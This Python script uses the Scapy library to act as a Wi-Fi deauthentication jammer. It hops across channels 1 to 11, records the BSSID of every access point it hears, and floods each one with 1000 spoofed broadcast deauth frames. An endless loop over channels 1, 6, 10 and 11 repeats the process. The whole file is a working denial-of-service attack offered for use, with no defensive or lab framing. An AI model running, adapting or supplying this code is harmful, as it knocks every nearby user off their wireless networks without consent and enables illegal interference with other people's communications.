#!/usr/bin/env python
from scapy.all import *
import os
import sys
from time import sleep

from scapy.all import (
  RadioTap,    # Adds additional metadata to an 802.11 frame
  Dot11,       # For creating 802.11 frame
  Dot11Deauth, # For creating deauth frame
  sendp,        # for sending packets
  conf
)


interface = 'wlxb4b024bce0bd'


def channel1():
   os.system(f"iwconfig {interface} channel 1")
   sleep(1)
   os.system(f"iwconfig {interface} channel 1")

   ch = []
   ch1= []

   if os.path.isfile('1.txt'):
      os.remove('1.txt')

   print("Deauth All AP In Channel 1")
   print("")

   def callback_1(frame):
      if frame.haslayer(Dot11):
         if frame.haslayer(Dot11Beacon) or frame.haslayer(Dot11ProbeResp):
            bssid = frame[Dot11].addr2
            #print(bssid)
            with open('1.txt', 'a') as file:
               sys.stdout = file
               print(bssid)
            sys.stdout = sys.__stdout__

   sniff(iface=interface, prn=callback_1, timeout=10)

   if os.path.isfile('1.txt'):
      with open('1.txt', 'r') as file:
         for line in file:
            ch.append(line)
   else:
      print("Nothing found!")
      print("Please check your Wi-Fi adapter")

   for i in ch:
      if i not in ch1:
         ch1.append(i)

   print(f"Number Of AP: {len(ch1)}")
   print("")
   for i in ch1:
      print("Deauth... ", i.upper())
      conf.verb = 0
      dot11 = Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=i, addr3=i)
      frame = RadioTap()/dot11/Dot11Deauth()
      sendp(frame, iface=interface, count=1000, inter=0.008)
   print("===================================")  
   if os.path.isfile('1.txt'):
      os.remove('1.txt')


def channel2():
   os.system(f"iwconfig {interface} channel 2")
   sleep(1)
   os.system(f"iwconfig {interface} channel 2")

   cch = []
   ch2= []

   if os.path.isfile('2.txt'):
      os.remove('2.txt')

   print("Deauth All AP In Channel 2")
   print("")

   def callback_1(frame):
      if frame.haslayer(Dot11):
         if frame.haslayer(Dot11Beacon) or frame.haslayer(Dot11ProbeResp):
            bssid = frame[Dot11].addr2
            #print(bssid)
            with open('2.txt', 'a') as file:
               sys.stdout = file
               print(bssid)
            sys.stdout = sys.__stdout__

   sniff(iface=interface, prn=callback_1, timeout=10)

   if os.path.isfile('2.txt'):
      with open('2.txt', 'r') as file:
         for line in file:
            cch.append(line)
   else:
      print("Nothing found!")
      print("Please check your Wi-Fi adapter")

   for i in cch:
      if i not in ch2:
         ch2.append(i)

   print(f"Number Of AP: {len(ch2)}")
   print("")
   for i in ch2:
      print("Deauth... ", i.upper())
      conf.verb = 0
      dot11 = Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=i, addr3=i)
      frame = RadioTap()/dot11/Dot11Deauth()
      sendp(frame, iface=interface, count=1000, inter=0.008)
   print("===================================")  
   if os.path.isfile('2.txt'):
      os.remove('2.txt')


def channel3():
   os.system(f"iwconfig {interface} channel 3")
   sleep(1)
   os.system(f"iwconfig {interface} channel 3")

   ccch = []
   ch3= []

   if os.path.isfile('3.txt'):
      os.remove('3.txt')

   print("Deauth All AP In Channel 3")
   print("")

   def callback_1(frame):
      if frame.haslayer(Dot11):
         if frame.haslayer(Dot11Beacon) or frame.haslayer(Dot11ProbeResp):
            bssid = frame[Dot11].addr2
            #print(bssid)
            with open('3.txt', 'a') as file:
               sys.stdout = file
               print(bssid)
            sys.stdout = sys.__stdout__

   sniff(iface=interface, prn=callback_1, timeout=10)

   if os.path.isfile('3.txt'):
      with open('3.txt', 'r') as file:
         for line in file:
            ccch.append(line)
   else:
      print("Nothing found!")
      print("Please check your Wi-Fi adapter")

   for i in ccch:
      if i not in ch3:
         ch3.append(i)

   print(f"Number Of AP: {len(ch3)}")
   print("")
   for i in ch3:
      print("Deauth... ", i.upper())
      conf.verb = 0
      dot11 = Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=i, addr3=i)
      frame = RadioTap()/dot11/Dot11Deauth()
      sendp(frame, iface=interface, count=1000, inter=0.008)
   print("===================================")  
   if os.path.isfile('3.txt'):
      os.remove('3.txt')


def channel4():
   os.system(f"iwconfig {interface} channel 4")
   sleep(1)
   os.system(f"iwconfig {interface} channel 4")

   cccch = []
   ch4= []

   if os.path.isfile('4.txt'):
      os.remove('4.txt')

   print("Deauth All AP In Channel 4")
   print("")

   def callback_1(frame):
      if frame.haslayer(Dot11):
         if frame.haslayer(Dot11Beacon) or frame.haslayer(Dot11ProbeResp):
            bssid = frame[Dot11].addr2
            #print(bssid)
            with open('4.txt', 'a') as file:
               sys.stdout = file
               print(bssid)
            sys.stdout = sys.__stdout__

   sniff(iface=interface, prn=callback_1, timeout=10)

   if os.path.isfile('4.txt'):
      with open('4.txt', 'r') as file:
         for line in file:
            cccch.append(line)
   else:
      print("Nothing found!")
      print("Please check your Wi-Fi adapter")

   for i in cccch:
      if i not in ch4:
         ch4.append(i)

   print(f"Number Of AP: {len(ch4)}")
   print("")
   for i in ch4:
      print("Deauth... ", i.upper())
      conf.verb = 0
      dot11 = Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=i, addr3=i)
      frame = RadioTap()/dot11/Dot11Deauth()
      sendp(frame, iface=interface, count=1000, inter=0.008)
   print("===================================")  
   if os.path.isfile('4.txt'):
      os.remove('4.txt')



def channel5():
   os.system(f"iwconfig {interface} channel 5")
   sleep(1)
   os.system(f"iwconfig {interface} channel 5")

   ccccch = []
   ch5= []

   if os.path.isfile('5.txt'):
      os.remove('5.txt')

   print("Deauth All AP In Channel 5")
   print("")

   def callback_1(frame):
      if frame.haslayer(Dot11):
         if frame.haslayer(Dot11Beacon) or frame.haslayer(Dot11ProbeResp):
            bssid = frame[Dot11].addr2
            #print(bssid)
            with open('5.txt', 'a') as file:
               sys.stdout = file
               print(bssid)
            sys.stdout = sys.__stdout__

   sniff(iface=interface, prn=callback_1, timeout=10)

   if os.path.isfile('5.txt'):
      with open('5.txt', 'r') as file:
         for line in file:
            ccccch.append(line)
   else:
      print("Nothing found!")
      print("Please check your Wi-Fi adapter")

   for i in ccccch:
      if i not in ch5:
         ch5.append(i)

   print(f"Number Of AP: {len(ch5)}")
   print("")
   for i in ch5:
      print("Deauth... ", i.upper())
      conf.verb = 0
      dot11 = Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=i, addr3=i)
      frame = RadioTap()/dot11/Dot11Deauth()
      sendp(frame, iface=interface, count=1000, inter=0.008)
   print("===================================")  
   if os.path.isfile('5.txt'):
      os.remove('5.txt')



def channel6():
   os.system(f"iwconfig {interface} channel 6")
   sleep(1)
   os.system(f"iwconfig {interface} channel 6")

   cccccch = []
   ch6= []

   if os.path.isfile('6.txt'):
      os.remove('6.txt')

   print("Deauth All AP In Channel 6")
   print("")

   def callback_1(frame):
      if frame.haslayer(Dot11):
         if frame.haslayer(Dot11Beacon) or frame.haslayer(Dot11ProbeResp):
            bssid = frame[Dot11].addr2
            #print(bssid)
            with open('6.txt', 'a') as file:
               sys.stdout = file
               print(bssid)
            sys.stdout = sys.__stdout__

   sniff(iface=interface, prn=callback_1, timeout=10)

   if os.path.isfile('6.txt'):
      with open('6.txt', 'r') as file:
         for line in file:
            cccccch.append(line)
   else:
      print("Nothing found!")
      print("Please check your Wi-Fi adapter")

   for i in cccccch:
      if i not in ch6:
         ch6.append(i)

   print(f"Number Of AP: {len(ch6)}")
   print("")
   for i in ch6:
      print("Deauth... ", i.upper())
      conf.verb = 0
      dot11 = Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=i, addr3=i)
      frame = RadioTap()/dot11/Dot11Deauth()
      sendp(frame, iface=interface, count=1000, inter=0.008)
   print("===================================")  
   if os.path.isfile('6.txt'):
      os.remove('6.txt')


def channel7():
   os.system(f"iwconfig {interface} channel 7")
   sleep(1)
   os.system(f"iwconfig {interface} channel 7")

   ccccccch = []
   ch7= []

   if os.path.isfile('7.txt'):
      os.remove('7.txt')

   print("Deauth All AP In Channel 7")
   print("")

   def callback_1(frame):
      if frame.haslayer(Dot11):
         if frame.haslayer(Dot11Beacon) or frame.haslayer(Dot11ProbeResp):
            bssid = frame[Dot11].addr2
            #print(bssid)
            with open('7.txt', 'a') as file:
               sys.stdout = file
               print(bssid)
            sys.stdout = sys.__stdout__

   sniff(iface=interface, prn=callback_1, timeout=10)

   if os.path.isfile('7.txt'):
      with open('7.txt', 'r') as file:
         for line in file:
            ccccccch.append(line)
   else:
      print("Nothing found!")
      print("Please check your Wi-Fi adapter")

   for i in ccccccch:
      if i not in ch7:
         ch7.append(i)

   print(f"Number Of AP: {len(ch7)}")
   print("")
   for i in ch7:
      print("Deauth... ", i.upper())
      conf.verb = 0
      dot11 = Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=i, addr3=i)
      frame = RadioTap()/dot11/Dot11Deauth()
      sendp(frame, iface=interface, count=1000, inter=0.008)
   print("===================================")  
   if os.path.isfile('7.txt'):
      os.remove('7.txt')

def channel8():
   os.system(f"iwconfig {interface} channel 8")
   sleep(1)
   os.system(f"iwconfig {interface} channel 8")

   cccccccch = []
   ch8= []

   if os.path.isfile('8.txt'):
      os.remove('8.txt')

   print("Deauth All AP In Channel 8")
   print("")

   def callback_1(frame):
      if frame.haslayer(Dot11):
         if frame.haslayer(Dot11Beacon) or frame.haslayer(Dot11ProbeResp):
            bssid = frame[Dot11].addr2
            #print(bssid)
            with open('8.txt', 'a') as file:
               sys.stdout = file
               print(bssid)
            sys.stdout = sys.__stdout__

   sniff(iface=interface, prn=callback_1, timeout=10)

   if os.path.isfile('8.txt'):
      with open('8.txt', 'r') as file:
         for line in file:
            cccccccch.append(line)
   else:
      print("Nothing found!")
      print("Please check your Wi-Fi adapter")

   for i in cccccccch:
      if i not in ch8:
         ch8.append(i)

   print(f"Number Of AP: {len(ch8)}")
   print("")
   for i in ch8:
      print("Deauth... ", i.upper())
      conf.verb = 0
      dot11 = Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=i, addr3=i)
      frame = RadioTap()/dot11/Dot11Deauth()
      sendp(frame, iface=interface, count=1000, inter=0.008)
   print("===================================")  
   if os.path.isfile('8.txt'):
      os.remove('8.txt')


def channel9():
   os.system(f"iwconfig {interface} channel 9")
   sleep(1)
   os.system(f"iwconfig {interface} channel 9")

   ccccccccch = []
   ch9= []

   if os.path.isfile('9.txt'):
      os.remove('9.txt')

   print("Deauth All AP In Channel 9")
   print("")

   def callback_1(frame):
      if frame.haslayer(Dot11):
         if frame.haslayer(Dot11Beacon) or frame.haslayer(Dot11ProbeResp):
            bssid = frame[Dot11].addr2
            #print(bssid)
            with open('9.txt', 'a') as file:
               sys.stdout = file
               print(bssid)
            sys.stdout = sys.__stdout__

   sniff(iface=interface, prn=callback_1, timeout=10)

   if os.path.isfile('9.txt'):
      with open('9.txt', 'r') as file:
         for line in file:
            ccccccccch.append(line)
   else:
      print("Nothing found!")
      print("Please check your Wi-Fi adapter")

   for i in ccccccccch:
      if i not in ch9:
         ch9.append(i)

   print(f"Number Of AP: {len(ch9)}")
   print("")
   for i in ch9:
      print("Deauth... ", i.upper())
      conf.verb = 0
      dot11 = Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=i, addr3=i)
      frame = RadioTap()/dot11/Dot11Deauth()
      sendp(frame, iface=interface, count=1000, inter=0.008)
   print("===================================")  
   if os.path.isfile('9.txt'):
      os.remove('9.txt')


def channel10():
   os.system(f"iwconfig {interface} channel 10")
   sleep(1)
   os.system(f"iwconfig {interface} channel 10")

   cccccccccch = []
   ch10= []

   if os.path.isfile('10.txt'):
      os.remove('10.txt')

   print("Deauth All AP In Channel 10")
   print("")

   def callback_1(frame):
      if frame.haslayer(Dot11):
         if frame.haslayer(Dot11Beacon) or frame.haslayer(Dot11ProbeResp):
            bssid = frame[Dot11].addr2
            #print(bssid)
            with open('10.txt', 'a') as file:
               sys.stdout = file
               print(bssid)
            sys.stdout = sys.__stdout__

   sniff(iface=interface, prn=callback_1, timeout=10)

   if os.path.isfile('10.txt'):
      with open('10.txt', 'r') as file:
         for line in file:
            cccccccccch.append(line)
   else:
      print("Nothing found!")
      print("Please check your Wi-Fi adapter")

   for i in cccccccccch:
      if i not in ch10:
         ch10.append(i)

   print(f"Number Of AP: {len(ch10)}")
   print("")
   for i in ch10:
      print("Deauth... ", i.upper())
      conf.verb = 0
      dot11 = Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=i, addr3=i)
      frame = RadioTap()/dot11/Dot11Deauth()
      sendp(frame, iface=interface, count=1000, inter=0.008)
   print("===================================")  
   if os.path.isfile('10.txt'):
      os.remove('10.txt')


def channel11():
   os.system(f"iwconfig {interface} channel 11")
   sleep(1)
   os.system(f"iwconfig {interface} channel 11")

   ccccccccccch = []
   ch11= []

   if os.path.isfile('11.txt'):
      os.remove('11.txt')

   print("Deauth All AP In Channel 11")
   print("")

   def callback_1(frame):
      if frame.haslayer(Dot11):
         if frame.haslayer(Dot11Beacon) or frame.haslayer(Dot11ProbeResp):
            bssid = frame[Dot11].addr2
            #print(bssid)
            with open('11.txt', 'a') as file:
               sys.stdout = file
               print(bssid)
            sys.stdout = sys.__stdout__

   sniff(iface=interface, prn=callback_1, timeout=10)

   if os.path.isfile('11.txt'):
      with open('11.txt', 'r') as file:
         for line in file:
            ccccccccccch.append(line)
   else:
      print("Nothing found!")
      print("Please check your Wi-Fi adapter")

   for i in ccccccccccch:
      if i not in ch11:
         ch11.append(i)

   print(f"Number Of AP: {len(ch11)}")
   print("")
   for i in ch11:
      print("Deauth... ", i.upper())
      conf.verb = 0
      dot11 = Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=i, addr3=i)
      frame = RadioTap()/dot11/Dot11Deauth()
      sendp(frame, iface=interface, count=1000, inter=0.008)
   print("===================================")  
   if os.path.isfile('11.txt'):
      os.remove('11.txt')


def all():
   while True:
      channel1()
      channel2()
      channel3()
      channel4()
      channel5()
      channel6()
      channel7()
      channel8()
      channel9()
      channel10()
      channel11()

def common():
   while True:
      channel1()
      channel6()
      channel10()
      channel11()

common()

